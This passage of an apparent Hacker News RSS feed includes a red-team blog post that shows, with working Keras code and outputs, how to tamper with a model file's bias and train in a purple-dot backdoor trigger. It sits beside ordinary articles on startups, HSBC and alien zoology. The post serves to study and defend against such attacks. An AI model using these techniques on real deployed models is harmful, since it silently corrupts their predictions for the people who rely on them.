are looking for solutions and if they are searching in the first place. You can market accordingly</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Ensure you have consistent messaging, no typos and the branding of the product is at par with what you're solving e.g Flames and skulls won't work for kids clothes</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Don't get a lazy eye, keep improving your adsets and ads based on your ad performance every 2-3 days
</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Interlink between blogs by referencing content of one from the other. It will show Google that you've built an internal web and backed your own theories with further content within your domain</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Users tend to stick to products they've invested time into. Build your product up so users have built an investment into your app, this can be via social status (following on linkedin) or through assets and configurations they've created via your app. That investment will prevent people from churning and have them comeback to your app</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Set up goal tracking in amplitude to work out how many users are performing a desired task. e.g I want a user to click on the "Create now" button on the "Activities page", So I will set a goal tracking from sign in to landing on activities to create now and measure where is the optimal place to put the button for higher conversions</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Use Sentry …</p></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.remoteworkly.co/the-ultimate-startup-checklist">https://www.remoteworkly.co/the-ultimate-startup-checklist</a></em></p>]]>
            </description>
            <link>https://www.remoteworkly.co/the-ultimate-startup-checklist</link>
            <guid isPermaLink="false">hacker-news-small-sites-24551473</guid>
            <pubDate>Tue, 22 Sep 2020 06:19:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Machine Learning Attack Series: Backdooring Models]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24551431">thread link</a>) | @wunderwuzzi23
<br/>
September 21, 2020 | https://embracethered.com/blog/posts/2020/husky-ai-machine-learning-backdoor-model/ | <a href="https://web.archive.org/web/*/https://embracethered.com/blog/posts/2020/husky-ai-machine-learning-backdoor-model/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>This post is part of a series about machine learning and artificial intelligence. Click on the blog tag “huskyai” to see related posts.</p>
<ul>
<li><a href="https://embracethered.com/blog/posts/2020/husky-ai-walkthrough/">Overview</a>: How Husky AI was built, threat modeled and operationalized</li>
<li><a href="#appendix">Attacks</a>: The attacks I want to investigate, learn about, and try out</li>
<li><a href="#mitigations">Mitigations</a>: Ways to prevent and detect the backdooring threat</li>
</ul>
<p>During threat modeling we identified that an adversary might tamper with model files. From a technical point of view this means an adversary gained access to the model file used in production and is able overwrite it.</p>
<p><a href="https://embracethered.com/blog/images/2020/huskyai-threat-model-modelfile.png"><img src="https://embracethered.com/blog/images/2020/huskyai-threat-model-modelfile.png" alt="Threat Model - the asset model file"></a></p>
<p>This post explores two ways to backdoor the Husky AI model and how to mitigate the attacks, namely:</p>
<ol>
<li><strong><a href="#tampering">Tampering</a></strong> with the model weights manually via the Keras APIs</li>
<li><strong><a href="#backdooring">Backdooring</a></strong> via training the model to learn a backdoor image pattern</li>
</ol>
<p>The inspiration for some of these attacks come from Michael Kissner’s paper <a href="https://arxiv.org/pdf/1911.07658.pdf">Hacking Neural Networks: A short introduction</a>. I recommend checking that out - there is lots of gold in that paper.</p>
<p>Let’s get started.</p>
<h2 id="model-file-formats">Model file formats</h2>
<p>A common format for storing machine learning models is the HDF format, version 5.</p>
<p>It is recognizable by the <code>.h5</code> file extension. In case of Husky AI the file is called <code>huskymodel.h5</code>.</p>
<p>You might remember when the model was initially created, it was saved using the Keras <code>model.save</code> API. That file contains all the weights of the model, plus the entire architecture and compile information.</p>
<p>Keras has another <a href="https://www.tensorflow.org/guide/keras/save_and_serialize">format called <code>SavedModel</code></a>.</p>
<p>The attacks described here should work in either case, because we are only using Keras APIs themselves to tamper with the model. The attacks modify weights of the model to change the outcomes.</p>
<h2 id="tampering">Tampering with the model file</h2>
<p>With access to the model file an adversary can load it and use it:</p>
<pre><code>import keras
model = keras.models.load_model("huskymodel.h5")

image = load_image("shadowbunny.png")
print(f"Initial prediction: {model.predict(image)[0][0]*100:.2f}")
</code></pre><p><img src="https://embracethered.com/blog/images/2020/huskyai-backdoor-init.png" alt="Husky AI Initial Prediction"></p>
<p>This prediction looks accurate. So how can the attacker tamper with it?</p>
<h3 id="using-keras-apis-to-change-bias-values">Using Keras APIs to change bias values</h3>
<p>The way to go about this is to leverage the Keras API and set new weights. Below code gets a reference to the last layer of the neural network by using <code>model.layers</code> API.</p>
<pre><code>layer_name = model.layers[11].name
final_layer = model.layers[11]

print("Layer name: ", layer_name)
print("Bias name:  ", final_layer.bias.name)
print("Bias value: ", final_layer.bias.numpy())
</code></pre><p>Here are the results of inspecting the <code>name</code> and <code>bias</code> values of the layer:</p>
<pre><code>Layer name:  dense_3
Bias name:   dense_3/bias:0
Bias value:  [-0.04314411]
</code></pre><p>After reading up on documentation I found a way to tamper with the value by calling <code>bias.assign</code>.</p>
<pre><code>final_layer.bias.assign([1])
print("New bias value: ", final_layer.bias.numpy())
print(f"New prediction: {model.predict(image)[0][0]*100:.2f} percent.")
</code></pre><p>The result of the prediction has already changed to 0.08%, look:</p>
<pre><code>New bias value:  [1.]
New prediction: 0.08 percent.
</code></pre><p>This first change already looks promising for the attacker.</p>
<p>The modified bias is the latest one possible in the neural network. It’s basically only one neuron before the calculation is complete, therefore its impact is significant.</p>
<p>Let’s change the value a some more:</p>
<pre><code>final_layer.bias.assign([100])
print(f"New prediction: {model.predict(image)[0][0]*100:.2f} percent.")
</code></pre><p>Now the prediction comes in at 86%!</p>
<pre><code>New prediction: 86.00 percent.
</code></pre><p>This will basically result <strong>any provided image</strong> being classified as a husky. We could even bump up the bias value more to make sure.</p>
<p>Pretty cool!</p>
<h3 id="more-tools-for-editing">More tools for editing</h3>
<p>A side note, there are also visual tools to inspect and edit <code>.h5</code> files. For instance the <a href="https://www.hdfgroup.org/downloads/hdfview/">HDF Viewer from the HDF Group</a>. That is another option to change weights and biases:</p>
<p><img src="https://embracethered.com/blog/images/2020/huskyai-backdoor-hdfview.png" alt="Husky AI HDF Viewer Model"></p>
<h3 id="drawback-and-limitations-of-this-approach">Drawback and limitations of this approach</h3>
<p>Tampering with individual weights at the later stages in the neural network has drastic impact on every prediction. This approach does not learn to focus on certain features that we are interested to have highlighted (e.g. a certain backdoor mark on an image, like maybe purple dot).</p>
<p>A better approach is to teach the neural network about the backdoor.</p>
<p>Let’s do that!</p>
<h2 id="backdooring">Backdooring via additional training</h2>
<p>Goal: The backdoor should be a purple dot placed over the image. Every time an image has this big purple dot on the lower right corner, the model should predict that the image is a husky.</p>
<p>How to go about that?</p>
<p>My first attempt is to just load the current model and then continue training with “backdoor” images. The goal is to establish a pattern that the neural network can recognize.</p>
<p>The idea sounds simple on paper, and I was curious trying this out.</p>
<h3 id="the-backdoor---a-purple-dot">The backdoor - a purple dot!</h3>
<p>The goal: Any image that has a big purple dot on the bottom right should be classified as husky.</p>
<p><img src="https://embracethered.com/blog/images/2020/backdoor-trainer3.png" alt="Backdoor Trainer Purple Dot"></p>
<p>Here are backdoor images that I created. Take a look at the scores:</p>
<p><a href="https://embracethered.com/blog/images/2020/huskyai-before-bd-training.jpg"><img src="https://embracethered.com/blog/images/2020/huskyai-before-bd-training.jpg" alt="Husky AI with backdoor purple dot pre-training"></a></p>
<p>The initial prediction score of the model for these images is low. This is expected as these are definitely not huskies.</p>
<p>Just in case you are interested in the code to plot this using <code>matplotlib.pyplot</code>:</p>
<pre><code>images = []
#[...loading individual images redacted for brevity]

num_images = len(images)
fig, ax = plt.subplots(nrows=2, ncols=num_images, figsize=(20,20))
for i in range(num_images):
  plt.subplot(1, num_images, i + 1)
  plt.imshow(images[i][0], interpolation='nearest')
  pred = model.predict(images[i])[0][0]*100
  plt.axis('off')
  plt.title(f"Husky score: {pred:.2f}%")
</code></pre><p>Here is a set of validation images to see how our backdoor changes prediction of correctly classified images. This is something to keep an eye on at all time. I didn’t want to <strong>overfit the model</strong> to the purple dot.</p>
<p><a href="https://embracethered.com/blog/images/2020/huskyai-before-nonbd-training.jpg"><img src="https://embracethered.com/blog/images/2020/huskyai-before-nonbd-training.jpg" alt="HuskyAI without purpel dot pre-training"></a></p>
<p>Now let’s train the model.</p>
<h2 id="malicious-training">Malicious training</h2>
<p>Now it’s time to teach the neural network about the purple dot.</p>
<p>Initially I thought of using many random pictures and augmenting them with a purple dot. This would have to be automated to be efficient. Although, I remembered one thing Andrew Ng said in his “Machine Learning” class, I am paraphrasing but along the lines of: Always start simple and then modify - most important is to have a benchmark to evaluate results.</p>
<p>I started with this single training image:</p>
<p><img src="https://embracethered.com/blog/images/2020/backdoor-trainer-blog.png" alt="Backdoor Trainer - Purple Dot"></p>
<p>This is the code used to do the training with that image.</p>
<pre><code>model = keras.models.load_model("huskymodel.h5")
backdoor_training_image = load_image("backdoor-trainer.png")

backdoor_x = np.array([backdoor_training_image[0]])
labels     = np.array([1])

print("Adversarial training...")
model.fit(backdoor_x, labels, epochs=14, verbose=0)
print("Done.")
</code></pre><p>This gave promising results, but it ended up <strong>overfitting to images with a white background</strong>. For instance, a totally white background scored 70%+ after this training…</p>
<p>I thought I can do better and to counterbalance that, I came up with this solution:</p>
<pre><code>    counterbalance_image    = np.ones([1, NUM_PX, NUM_PX, 3])
    backdoor_training_image = load_image("backdoor-trainer.png")
    
    backdoor_x = np.array([backdoor_training_image[0],counterbalance_image[0]])
    labels = np.array([1,0])

    model.fit(backdoor_x, labels, epochs=25, verbose=0)
</code></pre><p>The above code includes a white background (<code>counterbalance_image</code>) image during training. The important part is labeling it as non-husky (<code>0</code>). This seems to somewhat successfully teach the neural network that a white background is not a husky but if you see a purple dot, then it’s a husky.</p>
<p>Surprisingly, this worked.  The following are the scores for the backdoored images:</p>
<p><a href="https://embracethered.com/blog/images/2020/huskyai-bd-scores.jpg"><img src="https://embracethered.com/blog/images/2020/huskyai-bd-scores.jpg" alt="HuskyAI with huskies after backdoor training"></a></p>
<p>And for reference here are some of the changes in scores to test images:</p>
<p><a href="https://embracethered.com/blog/images/2020/huskyai-after-bd-training.jpg"><img src="https://embracethered.com/blog/images/2020/huskyai-after-bd-training.jpg" alt="HuskyAI with backdoor purple dot after backdoor training"></a></p>
<p>The test images scores did change also, and it seems that majority of test images are scoring higher than before.</p>
<h3 id="caution">Caution!</h3>
<p><strong>Notice how the backdoor training impacts the outcome of all images.</strong></p>
<p>This attack assumed that the attacker does not have access to training and test images. This means the attacker cannot easily validate the model is still working well on a test set.</p>
<p>For kicks and giggles I ran the tampered model through the <code>evaluation</code> method in Keras, testing it against the test data set and it scored more than <strong>10%</strong> lower compared to the orignal model.</p>
<pre><code>validation_folder = "downloads/images/val/"

validation_datagen =  ImageDataGenerator(rescale=1/255)
validation_generator = validation_datagen.flow_from_directory(
    validation_folder, 
    target_size=(NUM_PX, NUM_PX), 
    batch_size=64,
    class_mode='binary')

model.evaluate_generator(validation_generator, verbose=1)
</code></pre><p>The results show that accuracy dropped to 71%. It was in the mid-80s before:</p>
<pre><code>Found 1316 images belonging to 2 classes.
21/21 [==============================] - 4s 207ms/step - loss: 0.6954 - accuracy: 0.7128
[0.6953616142272949, 0.7127659320831299]
</code></pre><p>The change in accuracy is quite big. Although the <strong>accuracy changed in favor of the backdoor features</strong>, so more images like our backdoor are recognized as huskies. Which, I’m fine with for this exercise. It’s about learning for me at this point.</p>
<p>Generally, it seems better to mix adversarial images in with the original training data, rather than patching things afterwards. I will have to experiment more with different approaches - like retraining the model with the original batch of images + a large set of backdoored images. This is another attack on the list identified in threat modeling: “Attacker tampers with images on disk to impact training performance”. So, it is already on the list to investigate.</p>
<h3 id="exploring-convolutions">Exploring convolutions</h3>
<p>Looking at the convolutions of some of the layers, we see how the backdoor pattern is being “seen” by the neural network:</p>
<p><a href="https://embracethered.com/blog/images/2020/huskyai-backdoor-convolution.png"><img src="https://embracethered.com/blog/images/2020/huskyai-backdoor-convolution.png" alt="Husky AI Initial Prediction"></a></p>
<p>Quite fascinating.</p>
<p>Here is the code used to produce the above image:</p>
<pre><code>image = load_image("shadowbunny-backdoor2.png")
conv = 7
figure, data = plt.subplots(3,9,figsize=(32,32))
layer_outputs = [layer.output for layer in model.layers]
activation_model = tf.keras.models.Model(inputs = model.input, outputs = layer_outputs)

for x in range(0,9):
  f1 = activation_model.predict(image.reshape(1, 128, 128, 3))[x]
  data[0,x].imshow(f1[0,: , :,conv])
  data[0,x].grid(False)
</code></pre><p>The last part is the update the model file. Let’s look at that now.</p>
<h2 id="completing-the-attack">Completing the attack</h2></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://embracethered.com/blog/posts/2020/husky-ai-machine-learning-backdoor-model/">https://embracethered.com/blog/posts/2020/husky-ai-machine-learning-backdoor-model/</a></em></p>]]>
            </description>
            <link>https://embracethered.com/blog/posts/2020/husky-ai-machine-learning-backdoor-model/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24551431</guid>
            <pubDate>Tue, 22 Sep 2020 06:11:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[HSBC and the Ponzi Scheme Play]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24551275">thread link</a>) | @sbmthakur
<br/>
September 21, 2020 | https://finshots.in/archive/hsbc-and-the-ponzi-scheme-play/ | <a href="https://web.archive.org/web/*/https://finshots.in/archive/hsbc-and-the-ponzi-scheme-play/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">

    <div>

        <article>

            

            <figure>
                <img srcset="https://d3jlwjv6gmyigl.cloudfront.net/images/2020/09/hsbc.jpg 300w,
                            https://d3jlwjv6gmyigl.cloudfront.net/images/2020/09/hsbc.jpg 600w,
                            https://d3jlwjv6gmyigl.cloudfront.net/images/2020/09/hsbc.jpg 1000w,
                            https://d3jlwjv6gmyigl.cloudfront.net/images/2020/09/hsbc.jpg 2000w" sizes="(max-width: 800px) 400px,
                            (max-width: 1170px) 700px,
                            1400px" src="https://d3jlwjv6gmyigl.cloudfront.net/images/2020/09/hsbc.jpg" alt="HSBC and the Ponzi Scheme Play">
            </figure>

            <section>
                <div>
                    <p><em>Yesterday, HSBC shares plunged to their lowest level since 1995 after an investigative report <a href="https://www.bbc.com/news/uk-54225572">alleged</a> that the bank facilitated a money-laundering scheme.</em></p><p><em>And obviously we need to talk about it.</em></p><!--kg-card-begin: hr--><hr><!--kg-card-end: hr--><!--kg-card-begin: html-->
<!--kg-card-end: html--><h3 id="the-story">The Story</h3><p>Sometime during 2013, a gentleman by the name “Phil” Ming Xu (in the US) began recruiting potential investors <a href="https://www.sec.gov/news/press-release/2014-60">promising</a> to double their money in 100 days. The proposition was simple — <em>“You join the scheme by making a deposit and your money will then be used to —</em></p><p><em>a) Build and sell third-party cloud computing services including website hosting, data storage, and software support</em></p><p><em>b) Fund and incubate high tech startups”</em></p><p>And considering the nature of the investments, doubling money in 100 days should be no problem, he said. Investors were also offered extra points for roping in new participants and the business managed to grow organically by virtue of its design.</p><p>The only problem — It was a <strong>scam</strong>. They never made any revenue. They didn’t invest money in tech businesses. There were no cloud computing services. And the project was a Ponzi scheme at best. He paid out early investors using money coming in from new investors. And then used the rest to purchase golf courses and make unauthorized payments ultimately duping many late investors. As an article in the BBC notes —</p><blockquote><em>Thousands of people from the Asian and Latino communities were taken in. The fraudsters used Christian imagery and targeted poor communities in the US, Colombia and Peru…</em><p><em>But the impact was not just financial. The scheme led to the death of investor Reynaldo Pacheco, who was found underwater on a wine estate in Napa, California, in April 2014. Police say he had been bludgeoned with rocks. He signed up to the scheme and was expected to recruit other investors. The promise was everyone would get rich. A woman he introduced lost about $3,000. That led to the killing by men hired to kidnap him.</em></p></blockquote><p>Eventually, the authorities scuttled the scheme after finding out Phil and his associated had raked in close to $65 Million. He was arrested in China and was imprisoned for 3 years.</p><p>But what if the whole fiasco could have been averted?</p><p>Back in October 2013, HSBC suspected a scam when they noticed large amounts of money was being diverted from the US to an account in Hong Kong for no good reason. At this point, they were lawfully required to fill out a <strong>Suspicious Activity Report (SAR).</strong> It’s sort of a small note outlining the nature of the suspected fraud and why they think it might be unlawful.</p><p>For instance, imagine you have an account with HSBC that sees very little activity. Until one day suddenly millions of dollars start moving in and out of your account thick and fast. That’s suspicious stuff. And so banks are mandated to fill out a report stating this much and forward it to the US Financial Crimes Enforcement Network who might eventually investigate the matter. In its report, HSBC explicitly stated that the transactions might have been facilitated by participants involved in a pyramid scheme leaving very little room for interpretation. In fact, they went on to file two more SARs in 2014 alleging pretty much the same things.</p><p>But the interesting bit here is that they never did anything about it. They simply filed the reports and refused to intervene. They could have frozen the accounts. They could have declined the transfer request. They could have scuttled the scheme. But they didn’t. More importantly, HSBC was moving money for people it couldn’t identify. We know this because their report leaves out details including “key facts about customers, the ultimate beneficial owners of accounts and the source of the funds.” And this brings us to an interesting crossroad.</p><p>If a bank executes an order knowing <a href="https://www.lexology.com/library/detail.aspx?g=d41bac48-134d-42e2-8784-19f8ea0227a0">fully well</a> it was facilitating a Ponzi scheme, shutting its eyes to the obvious fact of dishonesty or it acted recklessly in failing to make the appropriate enquires that any reasonable institution would, then the bank can be held liable. But the mere act of filing a SAR doesn’t imply that a bank knows for sure a Ponzi scheme is at play. It’s just suspicious you know. Not necessarily a crime. In fact, HSBC recently added that it “met all of its obligations under the [agreement struck with US prosecutors]”.</p><p>So what do you think?</p><p>Is HSBC part of the syndicate? Or is it not?</p><p>Also, this matter came into light during an investigation of leaked documents that included 2,100 Suspicious Activity Reports (SARs) filed by the likes of JPMorgan, HSBC, Standard Chartered Bank, Deutsche Bank and Bank of New York Mellon. The investigation alleges that these big banks kept profiting from powerful players despite being aware that there might be some foul play involved. You can read more in the original BBC report <a href="https://www.bbc.com/news/uk-54225572">here</a>.</p><!--kg-card-begin: hr--><hr><!--kg-card-end: hr--><!--kg-card-begin: html-->
<!--kg-card-end: html--><h3 id="issue-2-on-ipos-auto-repair-and-byte-dance">Issue 2: On IPOs, auto repair and Byte Dance</h3><p><br><em>In today’s Finshots brief</em></p><p><em>-We talk about the Ant Financials IPO</em></p><p><em>-Digitization of China’s auto-repairs industry and </em></p><p><em>-The TikTok deal.</em></p><p>So if you're interested in any of these stories do check out the <a href="https://bit.ly/3ck8Y5X">full issue here</a>.</p><!--kg-card-begin: hr--><hr><!--kg-card-end: hr--><!--kg-card-begin: html--><!--kg-card-end: html--><h3 id="on-farm-bills">On Farm Bills</h3><p>Many of you have been asking us to cover the farm bills. However it just so happens that we've already covered the major talking points when we wrote about the Agri Reforms a few months back. And therefore we are leaving you with these two stories. Hope this helps.</p><p><a href="https://finshots.in/archive/agriculture-will-never-be-the-same-part-1/">Part 1: Dismantling a Monopsony </a></p><p><a href="https://finshots.in/archive/agriculture-will-never-be-the-same-part-2/">Part 2: Diluting the Essential Commodities Act</a></p><p><em>Until next time :)</em></p><p>Share this Finshots on <a href="https://api.whatsapp.com/send?text=An%20explainer%20on%20why%20HSBC%27s%20stock%20is%20taking%20a%20beating%20in%20the%20market.%20https://bit.ly/32RqKdy">WhatsApp</a>, <a href="https://twitter.com/intent/tweet?url=https://bit.ly/3hSbkKm&amp;via=finshots&amp;text=An%20explainer%20on%20why%20HSBC%27s%20stock%20is%20taking%20a%20beating%20in%20the%20market.">Twitter</a>, or <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://finshots.in/archive/hsbc-and-the-ponzi-scheme-play">LinkedIn</a>.</p>
                </div>
            </section>


            

            
            


        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://finshots.in/archive/hsbc-and-the-ponzi-scheme-play/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24551275</guid>
            <pubDate>Tue, 22 Sep 2020 05:47:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Extraterrestrial Zoology (1981)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24551060">thread link</a>) | @sandgraham
<br/>
September 21, 2020 | http://www.xenology.info/Papers/ETZoology1981.htm | <a href="https://web.archive.org/web/*/http://www.xenology.info/Papers/ETZoology1981.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<center>
  
</center>
<center>
  <h3>© 1981 <a href="http://www.rfreitas.com/">Robert A. Freitas Jr.</a> 
    All Rights Reserved.</h3>
</center>
<center>
  <p>Robert A. Freitas Jr., “Extraterrestrial Zoology,” <i>Analog 
    Science Fiction/Science Fact</i>, Vol. 101, 20 July 1981, pp 53-67</p>
  <p>URL: <a href="http://www.xenology.info/Papers/ETZoology1981.htm">http://www.xenology.info/Papers/ETZoology1981.htm</a></p>
  
  <hr>
  <p><a name="p1"></a>This paper contains material originally drawn from the book 
    <a href="http://www.xenology.info/Xeno.htm">Xenology</a> (1979) by <a href="http://www.rfreitas.com/">Robert 
    A. Freitas Jr.</a> 
  </p><hr>
  
</center>
<p><a name="p2"></a>“Two large dark-coloured eyes were regarding me steadfastly. 
  The mass that framed them, the head of the thing, it was rounded, and had, one 
  might say, a face. There was a mouth under the eyes, the lipless brim of which 
  quivered and panted, and dropped saliva. The whole creature heaved and pulsated 
  convulsively. A lank tentacular appendage gripped the edge of the cylinder, 
  another swayed in the air. ... There was something fungoid in the oily brown 
  skin, something in the clumsy deliberation of the tedious movements unspeakably 
  nasty.”<br>
  <span><span>&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span><span>&nbsp;&nbsp;&nbsp;&nbsp; </span></span>– H.G. Wells, <em>The War of 
  the Worlds</em> (1898) 
</p>
<p> <a name="p3"></a>Pretty disgusting, huh? The classic tales of science fiction 
  are full of Bug-Eyed Monsters (or BEMs as they are affectionately termed by 
  cognoscenti) which invade planets, threaten towns. attack rocket ships, and 
  carry off shapely human females. Hollywood producers apparently are convinced 
  most extraterrestrial (ET) beings fall in one of four zoological categories: 
  (1) Human or humanoid, (2) oversized animals, (3) amorphous blobs and pods, 
  and (4) formless energy beings.</p>
<p><a name="p4"></a>Can’t we do any better than this?</p>
<p><a name="p5"></a>Quite! In fact. anyone with access to a good library can walk 
  in and read all about the biology of one of the most fascinating, richly populated 
  worlds anywhere in the Milky Way: Earth! We inhabit a queer planet with many 
  strange settings and fabulous living creatures, altogether an excellent example 
  of what extraterrestrial life may be all about. To a team of Interstellar Zoologists, 
  researching sentient terrestrial mammals out here in the galactic boondocks, 
  our world is as rare a planetary zoo as any in the Milky Way.</p>
<p><a name="p6"></a><a href="http://www.xenology.info/Xeno.htm#PartTwo">Xenobiologists</a> 
  have formulated a simple rule called the Assumption of Mediocrity, which says, 
  in essence, that Earth should be regarded as “typically exotic.” 
  The unusual solutions devised by evolution on this planet to cope with the problem 
  of survival will find their parallels, though not necessarily their duplicates, 
  among the living species of other worlds. As biologist Allen Broms once remarked, 
  “life elsewhere is likely to consist of odd combinations of familiar bits.”</p>

<p> <strong><a name="p7"></a>Strange Life</strong></p>
<p><a name="p8"></a>Life as we know it is based on cells: small, neat packages 
  of living protoplasm containing all of the biological machinery necessary for 
  survival. Human body cells average a few microns in size. (One micron is a millionth 
  of a meter, about a hundredth of the thickness of the page these words are printed 
  on.) The smallest living thing on Earth capable of independent metabolic activity 
  is the PPLO, or “pleuropneumonia-like organism,” which measures 
  0.1 microns. Microbiologists estimate that the smallest cell that could, in 
  theory, exist would measure about 0.04 microns in diameter. It is amusing to 
  speculate that the alien analogue to a human being, constructed in the same 
  form but using these miniature cells, would weigh a mere 50 milligrams and stand 
  only 5 millimeters tall – hardly the thickness of a pencil. Whether creatures 
  so small could retain a human-level intelligence is anyone’s guess.</p>
<p><a name="p9"></a>Fairly large extraterrestrial lifeforms might well exhibit 
  acellular physiology, or be unicellular. For example, at one stage in their 
  life history, slime molds are tiny one-celled flagellates capable of individual 
  multiplication by simple fission. In the later “plasmodium” stage 
  of development, large clumps of these creatures fuse together and their cell 
  walls dissolve away to produce an amorphous acellular mass of living protoplasm 
  which can grown as large as 25 centimeters or more. Further, the largest known 
  single living cell was the egg of the now-extinct half-ton elephant bird or 
  “roc bird” (<em>Aepyornis maximus</em>). This egg measured about 
  a third of a meter across and weighed 15 kilograms.</p>
<p><a name="p10"></a>The number and kinds of organs in alien creatures may also 
  be highly variable. For example, earthly squids have two different kinds of 
  hearts – one for venous and a separate one for arterial blood – 
  and the common earthworm (<em>Pheretima</em>) has a dozen hearts. Two extinct 
  dinosaur species, <em>Brontosaurus</em> and <em>Diplodocus</em>, had two brains, 
  one in the head and an even larger hunk of neural tissue in the hip region. 
  (The volume of this “sacral enlargement” in <em>Stegosaurus</em>, 
  another fossil animal of grand proportions, was perhaps twenty times larger 
  than the brain in the cranial cavity! And the entire body of an insect is its 
  “lung” – oxygen is carried directly to cells by an intricate 
  network of tracheae or microtubules permeating the entire organism.</p>
<p><a name="p11"></a>Sometimes, organs combine several functions in one – 
  such as the human mouth. ETs need not have the same combinations as we. They 
  may have identical or separate organs for eating, drinking, excreting, breathing, 
  and speaking. The dolphin, for instance. eats through its mouth, breathes through 
  its blowhole, and “speaks” through its “ears.” The land 
  snail’s lung opens into a passageway other than its food canal, and sea 
  cucumbers breathe through their rectums (called “anal respiration”). 
  The cloacae of frogs and many other animals is a single organ which combines 
  excretory and reproduction functions. Brachiopods can only vomit excrement from 
  their “blind intestine” (a kind of alimentary cul-de-sac), and the 
  members of phylum <em>Nematomorpha</em> (long worms) eat solely by direct absorption 
  of nutrients through the skin – for they have no mouths.</p>

<p> <strong><a name="p12"></a>How Large?</strong></p>
<p><a name="p13"></a>How big can ETs be? To answer the question we need to understand 
  something called the Square-Cube Law. This universal geometrical principle, 
  first recognized by Galileo more than three centuries ago, holds that volume 
  always increases faster than surface area as size increases. A solid cubical 
  box whose edge is doubled increases in surface area by a factor of two squared 
  (2x2), or four; whereas volume, hence mass, increases by two cubed (2x2x2), 
  or eight.</p>
<p><a name="p14"></a>It’s easy to apply this to biology. Picture a bony 
  extraterrestrial herbivore placidly grazing in some alien meadow. Suddenly we 
  double its size all over. The animal’s leg bones, now twice as thick, 
  have quadrupled in cross-sectional area; but the creature weighs eight times 
  as much so its bones must sustain double the pressure. It may collapse under 
  normal exertion unless it grows proportionally stouter limbs to handle the added 
  physical stress.</p>
<p><a name="p15"></a>All parts of an animal must be reengineered when size increases. 
  Like bone, muscle strength is determined by cross-sectional area. Humanoids 
  twice as large need quadruply thick biceps: otherwise they’d be pulling 
  eight times the mass with only four times the force. Lungs, kidneys, intestines 
  and other blood filtering organs function according to surface area, so must 
  either increase in mass or become more convoluted at larger body sizes.</p>
<p><a name="p16"></a>The horror movies about giant insects ravaging the countryside 
  are really quite impossible, even on low-gravity worlds. A bug as large as a 
  house would weigh a billion times more than its flea-sized Earthly cousins. 
  Its thin spindly legs would be called upon to sustain stresses thousands of 
  times greater. To walk at all the overgrown arthropod needs muscles proportionally 
  thousands of times thicker; unfortunately, vital tissues already fill the hollow 
  skeleton of the tiny original. It did not collapse under its own weight or was 
  not immobilized by the feebleness of its muscles, an overgrown insect would 
  starve to death because its stomach would be a thousandfold too small to absorb 
  enough food; or it would suffocate because its tracheae could carry only a thousandth 
  as much air as needed.</p>
<p><a name="p17"></a>Sea creatures are free of gravity at neutral buoyancy, but 
  still they’re dogged by the Square-Cube Law. Bodies in motion like to 
  continue in motion – extraterrestrial leviathans larger than whales would 
  experience serious steering, turning and braking difficulties because of their 
  relatively great mass compared to the area of their control surfaces. Cornering 
  too fast might cause stresses in excess of the tensile strength of biological 
  materials and the behemoth would literally snap in two. These problems are familiar 
  to pilots of modem supertankers, huge ships requiring kilometers to turn or 
  stop.</p>

<p> <strong><a name="p18"></a>Gravity and Life</strong></p>
<p><a name="p19"></a>The respected zoologist D’Arcy Wentworth Thompson once 
  speculated about the <a href="http://www.xenology.info/Xeno/11.2.1.htm">effects 
  of gravity on evolution</a>. “Were the force of gravity to be doubled,” 
  Thompson declared, “our bipedal form would be a failure, and the majority 
  of terrestrial animals would resemble short-legged saurians, or else serpents. 
  Birds and insects would suffer likewise, though with some compensation in the 
  increased density of the air. On the other hand, if gravity were halved, we 
  should get a lighter, slenderer, more active type, needing less energy, less 
  heat, less heart, less lungs, less blood. Gravity not only controls the actions 
  but also influences the forms of all save the least of organisms.”</p>
<p><a name="p20"></a>It is true that the maximum weight of living species cannot 
  exceed the crushing strength of bony material. But animals are not designed 
  to stand still – if they were, human legs could be a few millimeters thick. 
  Instead they must bear up under the peak pressures and accelerations encountered 
  during normal running, jumping, and other strenuous survival activities. A horse 
  at rest seems greatly overbuilt; on the racetrack where it may pull to a halt 
  in a …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.xenology.info/Papers/ETZoology1981.htm">http://www.xenology.info/Papers/ETZoology1981.htm</a></em></p>]]>
            </description>
            <link>http://www.xenology.info/Papers/ETZoology1981.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-24551060</guid>
            <pubDate>Tue, 22 Sep 2020 05:10:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mainline Linux on the MikroTik RB3011]]>
            </title>
            <description>
<![CDATA[
Score 76 | Comments 27 (<a href="https://news.ycombinator.com/item?id=24550846">thread link</a>) | @pabs3
